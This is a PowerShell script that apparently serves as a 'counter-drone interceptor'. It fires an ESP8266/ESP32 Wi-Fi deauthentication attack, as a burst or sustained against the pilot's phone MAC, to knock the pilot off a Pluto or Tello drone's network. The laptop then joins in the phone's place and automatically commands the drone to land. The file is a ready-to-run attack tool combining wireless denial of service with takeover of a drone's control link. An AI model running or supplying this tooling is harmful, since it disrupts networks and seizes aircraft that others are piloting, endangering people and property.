<#
  interceptor.ps1 - turn this laptop into the counter-drone INTERCEPTOR station.

  The laptop has ONE WiFi radio, so it can be on the drone's network OR the
  internet, not both. This script handles the whole hand-off:

    0. (optional -Deauth) fires the ESP8266 deauther to knock the pilot's phone
       off the drone, freeing the single client slot so the laptop can join,
    1. remembers your current internet WiFi,
    2. joins the drone's WiFi (creating a profile if needed; open or WPA2),
    3. starts the backend + dashboard locally (NO internet needed),
    4. opens the dashboard - the LAND button is armed for your drone,
    5. when you press ENTER, cleanly stops everything and reconnects your internet.

  Why -Deauth: the Pluto/Tello AP is first-connection-holds - while the phone
  holds the one slot, the laptop is refused. A short deauth burst (its own ESP
  radio, separate from the laptop's WiFi) frees it; the burst then STOPS and the
  laptop grabs the freed slot before the phone reconnects. Without an ESP board
  the deauth degrades to a harmless mock and the join proceeds unchanged.

  Phone = pilot. Laptop = interceptor: clicking LAND commands your own drone to
  land. The backend routes LAND to the right stack by SSID:
    * TELLO-* -> Tello UDP SDK (192.168.10.1:8889)  [single-client: laptop seizes the link]
    * else    -> Pluto MSP over TCP (192.168.4.1:23)

  Examples:
    powershell -ExecutionPolicy Bypass -File interceptor.ps1 -DroneSsid TELLO-954B1F
    powershell -ExecutionPolicy Bypass -File interceptor.ps1 -DroneSsid PlutoX_2025_1043
    powershell -ExecutionPolicy Bypass -File interceptor.ps1 -DroneSsid PlutoX_2025_1043 -Deauth -DeauthPort COM8
#>
param(
  [string]$DroneSsid = 'PlutoX_2025_1129',
  [string]$Password  = '',           # empty = reuse the existing saved profile (or open network)
  [switch]$Deauth,                   # fire the ESP8266 deauth to free the slot before joining
  [string]$DeauthPort = $env:DEAUTH_PORT,   # e.g. COM8; empty = auto-detect the CP210x/CH340 port
  [double]$DeauthSeconds = 6,        # length of the deauth burst before we seize the slot
  [string]$DeauthFirmware = 'deauther',     # deauther (ESP8266, default) | marauder (ESP32)
  [int]$DeauthIndex = -1,            # skip the ESP scan and deauth this AP index directly (-1 = scan)
  [switch]$StationDeauth,            # SUSTAINED deauth of the phone only (keeps it out while we grab the slot)
  [string]$PhoneMac = ''             # phone's MAC on the drone net (from --scan-stations); '' = auto-pick
)

$ErrorActionPreference = 'Stop'
$RepoRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

# Full diagnostic log to a file so failures can be read back after the run
# (the console scrolls / the Wi-Fi hop drops SSH). Fresh file each run.
$LogPath = Join-Path $RepoRoot 'interceptor-log.md'
function Log([string]$msg, [string]$color = 'Gray') {
  $line = ('{0}  {1}' -f (Get-Date -Format 'HH:mm:ss'), $msg)
  Write-Host $line -ForegroundColor $color
  try { Add-Content -Path $LogPath -Value $line -ErrorAction SilentlyContinue } catch {}
}
function LogRaw([string]$text) {
  try {
    Add-Content -Path $LogPath -Value '```' -ErrorAction SilentlyContinue
    Add-Content -Path $LogPath -Value $text.TrimEnd() -ErrorAction SilentlyContinue
    Add-Content -Path $LogPath -Value '```' -ErrorAction SilentlyContinue
  } catch {}
}
"# interceptor run - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n" | Out-File -FilePath $LogPath -Encoding utf8

# No -Password given? Fall back to Password= in the gitignored .env.local, so
# `npm run intercept` can join without the secret living in this tracked file.
if (-not $Password) {
  $envFile = Join-Path $RepoRoot '.env.local'
  if (Test-Path $envFile) {
    $pwLine = Get-Content $envFile | Where-Object { $_ -match '^\s*Password\s*=' } | Select-Object -First 1
    if ($pwLine) {
      $Password = ($pwLine -replace '^\s*Password\s*=\s*', '').Trim()
      if ($Password) { Log "Using Wi-Fi password from .env.local (len=$($Password.Length))" 'DarkGray' }
    }
  }
}

function Get-CurrentSsid {
  $line = (netsh wlan show interfaces | Select-String '^\s*SSID\s*:' | Select-Object -First 1)
  if ($line) { return ($line.ToString() -replace '^\s*SSID\s*:\s*', '').Trim() }
  return ''
}

function Test-ProfileExists([string]$name) {
  return [bool]((netsh wlan show profiles) | Select-String ([regex]::Escape($name)))
}

# (Re)create a WLAN profile (open or WPA2-PSK). We ALWAYS regenerate + overwrite
# rather than reuse a saved one: an earlier passwordless run can leave a stale
# OPEN profile that then silently fails WPA2 auth forever. netsh add profile
# overwrites a same-name profile, so this repairs that case every run.
function Ensure-Profile([string]$ssid, [string]$pass) {
  netsh wlan delete profile name="$ssid" | Out-Null   # drop any stale/open profile (no-op if none)
  if ([string]::IsNullOrEmpty($pass)) {
    $sec = @"
    <security><authEncryption><authentication>open</authentication><encryption>none</encryption><useOneX>false</useOneX></authEncryption></security>
"@
  } else {
    $sec = @"
    <security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption>
    <sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>$pass</keyMaterial></sharedKey></security>
"@
  }
  $xml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>$ssid</name>
  <SSIDConfig><SSID><name>$ssid</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>manual</connectionMode>
  <MSM>
$sec
  </MSM>
</WLANProfile>
"@
  $path = Join-Path $env:TEMP ("wlan_" + ($ssid -replace '[^A-Za-z0-9]', '_') + ".xml")
  $xml | Out-File -FilePath $path -Encoding utf8
  netsh wlan add profile filename="$path" user=current | Out-Null
  Remove-Item $path -Force -ErrorAction SilentlyContinue
}

function Stop-OnPort([int]$port) {
  try {
    Get-NetTCPConnection -LocalPort $port -State Listen -ErrorAction SilentlyContinue |
      Select-Object -ExpandProperty OwningProcess -Unique |
      ForEach-Object { Stop-Process -Id $_ -Force -ErrorAction SilentlyContinue }
  } catch {}
}

# Remember the internet network so we can come back to it.
$origSsid = Get-CurrentSsid
if (-not $origSsid -or $origSsid -eq $DroneSsid) { $origSsid = 'NxtWave_Te@m' }
Write-Host "Current internet network : $origSsid" -ForegroundColor Cyan

# Stop every auto-connect profile from stealing the adapter mid-session.
$autoProfiles = @()
$profNames = (netsh wlan show profiles) |
  Select-String 'All User Profile\s*:\s*(.+)$' |
  ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
foreach ($pn in $profNames) {
  if ($pn -eq $DroneSsid) { continue }
  $modeLine = (netsh wlan show profile name="$pn") | Select-String 'Connection mode'
  if ($modeLine -match 'automatically|auto') {
    $autoProfiles += $pn
    netsh wlan set profileparameter name="$pn" connectionmode=manual | Out-Null
  }
}

function Restore-Internet {
  Write-Host "`nReconnecting your internet ($origSsid)..." -ForegroundColor Cyan
  foreach ($pn in $autoProfiles) { netsh wlan set profileparameter name="$pn" connectionmode=auto | Out-Null }
  netsh wlan connect name="$origSsid" ssid="$origSsid" 2>$null | Out-Null
  Start-Sleep -Seconds 3
  Write-Host ("Now on: " + (Get-CurrentSsid)) -ForegroundColor Green
}

$backend = $null
try {
  # --- 0. Deauth to free the drone's single client slot (optional) -----------
  # The ESP is a separate radio, so this runs while we're still on the internet.
  $stationDeauthActive = $false
  if ($StationDeauth) {
    # SUSTAINED, phone-only deauth: keeps the pilot's phone out (targeted at its
    # MAC) while we join with the laptop, which is NOT targeted. Fire-and-forget:
    # the ESP keeps attacking until we send --stop after LAND. This is the
    # reliable win for the single-slot handoff on one radio.
    Log "Starting SUSTAINED phone-targeted deauth (station) ..." 'Yellow'
    $sargs = @('-m', 'ml.runtime.deauth_esp32', '--ssid', $DroneSsid, '--firmware', $DeauthFirmware)
    if ($DeauthPort)        { $sargs += @('--port', $DeauthPort) }
    if ($DeauthIndex -ge 0) { $sargs += @('--index', "$DeauthIndex") }
    if ($PhoneMac)          { $sargs += @('--station-mac', $PhoneMac) }   # explicit MAC
    else                    { $sargs += @('--attack-phone') }            # auto-find client on our AP
    $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    try { $sout = (& python @sargs 2>&1 | Out-String); Write-Host $sout.Trim(); LogRaw $sout }
    catch { Log "Station-deauth step error (continuing): $_" 'Red' }
    $ErrorActionPreference = $prevEAP
    if ($sout -match 'deauth-station') {
      $stationDeauthActive = $true; Log "Phone held out (sustained); grabbing the slot..." 'Green'
    } else {
      Log "Could not start phone deauth (no client found?). Falling back to join anyway." 'Yellow'
    }
  }
  elseif ($Deauth) {
    # Burst deauth (AP-wide): knock the phone off, then STOP, then race to join.
    # Less reliable than -StationDeauth because the phone can re-grab the slot.
    Log "Firing ESP deauth on '$DroneSsid' ($DeauthFirmware) to free the client slot..." 'Yellow'
    $dargs = @('-m', 'ml.runtime.deauth_esp32', '--ssid', $DroneSsid,
               '--duration', "$DeauthSeconds", '--firmware', $DeauthFirmware)
    if ($DeauthPort)        { $dargs += @('--port', $DeauthPort) }
    if ($DeauthIndex -ge 0) { $dargs += @('--index', "$DeauthIndex") }
    $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    try { $dout = (& python @dargs 2>&1 | Out-String); Write-Host $dout.Trim(); LogRaw $dout }
    catch { Log "Deauth step error (continuing): $_" 'Red' }
    $ErrorActionPreference = $prevEAP
    Log "Deauth burst done - seizing the freed slot now." 'Green'
  }

  # --- 1. Join the drone -----------------------------------------------------
  Log "Joining drone WiFi ($DroneSsid)..." 'Yellow'
  Ensure-Profile $DroneSsid $Password
  netsh wlan set profileparameter name="$DroneSsid" connectionmode=manual | Out-Null
  netsh wlan disconnect | Out-Null
  Start-Sleep -Seconds 2

  # Re-issue the connect each attempt (one-shot connect can fail if the AP isn't
  # in the adapter's scan cache yet) and surface netsh's actual reason on failure.
  $joined = $false
  for ($i = 0; $i -lt 20; $i++) {
    $cur = Get-CurrentSsid
    if ($cur -eq $DroneSsid) { $joined = $true; break }
    # capture netsh stderr without aborting (EAP is 'Stop' script-wide)
    $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    $res = (netsh wlan connect name="$DroneSsid" ssid="$DroneSsid" 2>&1 | Out-String).Trim()
    $ErrorActionPreference = $prevEAP
    if ($res -and $res -notmatch 'was completed successfully') {
      Log ("  t+{0,2}s ssid={1} connect: {2}" -f ($i*3), $cur, $res) 'DarkYellow'
    }
    Start-Sleep -Seconds 3
  }
  if (-not $joined) {
    Log "JOIN FAILED after 60s. last ssid=$(Get-CurrentSsid)" 'Red'
    throw "Could not join $DroneSsid after 60s. Check the password (plutox... in .env.local) and that the drone is broadcasting. Last SSID: $(Get-CurrentSsid)."
  }
  Log "Joined $DroneSsid." 'Green'

  # Dump the network we actually got - the key clue for a failed LAND: does the
  # laptop have an IP on the drone subnet, and what is the real gateway/host?
  Start-Sleep -Seconds 3   # let DHCP assign
  $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  $ipcfg = (Get-NetIPConfiguration -InterfaceAlias 'Wi-Fi' -ErrorAction SilentlyContinue |
            Out-String)
  if (-not $ipcfg.Trim()) { $ipcfg = (ipconfig | Out-String) }
  $ErrorActionPreference = $prevEAP
  Log "--- network after join ---"
  LogRaw $ipcfg

  # Wait until we have a REACHABLE route to the drone's gateway before landing.
  # LAND is TCP to that gateway - firing before DHCP finishes gives WinError 10051
  # (unreachable network) and the command never reaches the drone.
  # Wait for DHCP to give us an IPv4 on the drone subnet. The key diagnostic for
  # single-client: if the phone holds the slot, we associate but get NO IP.
  Log "Waiting for a route to the drone (post-join DHCP, up to 30s)..." 'Yellow'
  $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  $gw = $null
  for ($i = 0; $i -lt 15; $i++) {
    $cfg = Get-NetIPConfiguration -InterfaceAlias 'Wi-Fi' -ErrorAction SilentlyContinue
    $ip  = ($cfg.IPv4Address | Select-Object -First 1).IPAddress
    $cand = ($cfg.IPv4DefaultGateway | Select-Object -First 1).NextHop
    $ok = $false
    if ($cand) {
      try { $ok = Test-Connection -ComputerName $cand -Count 1 -Quiet -ErrorAction Stop } catch { $ok = $false }
    }
    Log ("  t+{0,2}s ip={1} gateway={2} ping={3}" -f ($i*2), $ip, $cand, $ok) 'DarkGray'
    if ($ip -and $cand -and $ok) { $gw = $cand; break }
    Start-Sleep -Seconds 2
  }
  $ErrorActionPreference = $prevEAP
  if ($gw) {
    Log "Got IP + reachable gateway $gw - sending LAND." 'Green'
  } else {
    Log "NO IP from the drone after 30s - it accepted the association but DHCP gave no address (phone holds the slot => single-client). Cannot LAND." 'Red'
    $gw = '192.168.4.1'
  }

  # Probe the control port so the log shows whether the MSP link is even open.
  $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  $portOpen = (Test-NetConnection $gw -Port 23 -WarningAction SilentlyContinue).TcpTestSucceeded
  $ErrorActionPreference = $prevEAP
  Log "control link ${gw}:23 tcp-open=$portOpen"

  # --- 1b. Send LAND automatically (the whole point of the intercept) --------
  # interceptor.py (Pi) auto-lands; do the same here instead of only arming the
  # dashboard button. Route by SSID: TELLO/RMTT -> Tello UDP SDK, else Pluto MSP.
  Log "Commanding LAND on $DroneSsid (host=$gw port=$env:PLUTO_PORT) ..." 'Yellow'
  $env:PLUTO_HOST = $gw
  if (-not $env:PLUTO_PORT) { $env:PLUTO_PORT = '23' }
  $landed = $false
  $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  if ($DroneSsid -match '^(TELLO|RMTT)') {
    $out = (python -m ml.runtime.tello_control --enabled --authorized $DroneSsid --ssid $DroneSsid 2>&1 | Out-String)
    Write-Host $out.Trim(); LogRaw $out
    if ($out -match 'land|command') { $landed = $true }
  } else {
    for ($attempt = 1; $attempt -le 5; $attempt++) {
      $out = (python -m ml.runtime.pluto_control --enabled --authorized $DroneSsid --ssid $DroneSsid 2>&1 | Out-String)
      Write-Host $out.Trim()
      Log "LAND attempt $attempt/5:"; LogRaw $out
      # Accept only a real send - reject the "commanded land" that plutocontrol
      # still prints when the socket was actually unreachable.
      if ($out -match 'commanded land' -and
          $out -notmatch '10051|unreachable|Error connecting to server') { $landed = $true; break }
      Log "  LAND not through yet (attempt $attempt/5) - route still settling; retrying..." 'DarkYellow'
      Start-Sleep -Seconds 3
    }
  }
  $ErrorActionPreference = $prevEAP
  if ($landed) {
    Log "LAND SENT - drone commanded down." 'Green'
  } else {
    Log "LAND NOT CONFIRMED. joined but control link didn't answer (see the pluto_control output + tcp-open above)." 'Red'
  }

  # Stop the sustained phone deauth now that we hold the slot + landed.
  if ($stationDeauthActive) {
    Log "Stopping sustained phone deauth..." 'Yellow'
    $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    $stopArgs = @('-m', 'ml.runtime.deauth_esp32', '--stop')
    if ($DeauthPort) { $stopArgs += @('--port', $DeauthPort) }
    try { (& python @stopArgs 2>&1 | Out-String) | ForEach-Object { LogRaw $_ } } catch {}
    $ErrorActionPreference = $prevEAP
    $stationDeauthActive = $false
  }

  # --- 2. Launch the backend console (has its own LAND button) ---------------
  # Only the Python console on 8080 (reliable, no build step, works offline). We
  # skip the Vite UI on 8443: strictPort + slow offline start made it flaky and
  # left orphaned node procs. 8080 has the same two-tap LAND button.
  $env:PLUTO_SSID = $DroneSsid   # target token the backend arms + routes on

  Stop-OnPort 8080

  Log "Starting backend console (port 8080)..." 'Yellow'
  Start-Process -FilePath 'python' `
    -ArgumentList '-m', 'ml.runtime.dashboard', '--host', '127.0.0.1', '--port', '8080', '--no-open' `
    -WorkingDirectory $RepoRoot -WindowStyle Minimized | Out-Null

  $uiUp = $false
  for ($i = 0; $i -lt 20; $i++) {
    Start-Sleep -Seconds 1
    if (Get-NetTCPConnection -LocalPort 8080 -State Listen -ErrorAction SilentlyContinue) { $uiUp = $true; break }
  }
  Log "backend 8080 listening=$uiUp"
  if ($uiUp) { Start-Process 'http://127.0.0.1:8080' }

  Write-Host "`n================ INTERCEPTOR ONLINE ================" -ForegroundColor Green
  Write-Host "  Console : http://127.0.0.1:8080   (LAND button here)"
  Write-Host "  Target  : $DroneSsid"
  Write-Host "  Auto-LAND already fired above; use the button to re-send if needed."
  Write-Host "  Log     : interceptor-log.md"
  Write-Host "===================================================" -ForegroundColor Green
  Write-Host "`nConfirm the drone is DOWN, then press ENTER to reconnect your internet..." -ForegroundColor Cyan
  [void][System.Console]::ReadLine()
}
finally {
  Log "Shutting down interceptor..." 'Yellow'
  # Safety net: never leave the ESP deauthing the phone if we bailed early.
  if ($stationDeauthActive) {
    $prevEAP = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    $stopArgs = @('-m', 'ml.runtime.deauth_esp32', '--stop')
    if ($DeauthPort) { $stopArgs += @('--port', $DeauthPort) }
    try { & python @stopArgs 2>&1 | Out-Null } catch {}
    $ErrorActionPreference = $prevEAP
    Log "sustained deauth stopped (cleanup)." 'DarkGray'
  }
  Stop-OnPort 8080
  Stop-OnPort 8443
  Restore-Internet
  Log "Interceptor stopped. Back online. Full log: interceptor-log.md" 'Green'
}
